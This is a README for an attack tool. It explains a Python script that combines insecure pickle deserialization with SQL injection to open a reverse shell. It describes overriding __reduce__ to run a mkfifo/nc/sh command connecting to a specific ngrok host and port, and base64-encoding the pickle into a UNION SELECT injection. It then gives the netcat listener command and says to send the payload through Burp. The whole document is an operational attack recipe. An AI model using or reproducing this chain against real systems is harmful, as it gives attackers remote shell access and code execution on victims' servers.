# reverse_shell_pickle
This reverse shell code was able to inject SQL allocated Pickle written in Python Code:
    The script imports necessary modules such as sys, base64, pickle, urllib.parse, and requests for various functionalities.
    Next, a class named Payload is defined. This class has a single method called __reduce__. In Python, the __reduce__ method is used by the pickle module for serialization and deserialization. In this case, the __reduce__ method is overridden to define a custom behaviour for serialization. Inside this method, an operating system command is constructed to establish a reverse shell connection.
    The command (cmd) used in this example uses the mkfifo command to create a named pipe, nc command to connect to a remote host (0.tcp.ap.ngrok.io) on a specific port (15792), and >/tmp/p | /bin/sh > /tmp/p 2>&1 to redirect the input/output to the named pipe and execute a shell command.
    The if __name__ == "__main__": condition ensures that the code block underneath is only executed if the script is being run directly (as opposed to being imported as a module).
    Within the if block, an instance of the Payload class is created and serialized using pickle.dumps(). The serialized payload is then base64-encoded to make it suitable for inclusion in a SQL query.
    The payload string is constructed by appending the serialized and encoded payload to a SQL injection payload. The SQL injection payload is formed by closing a single quotation mark ('), adding the UNION SELECT clause, and then injecting the payload.
    The payload string is further modified using requests.utils.requote_uri() to ensure proper URL encoding.
    Finally, the modified payload is printed to the console.

    
nc listener on any port of your choice you can use the command below:

nc -lnvp <port-num>

Now copy the payload string that we got from the output just now and paste into burp to send request.

Go back to nc then here we go.
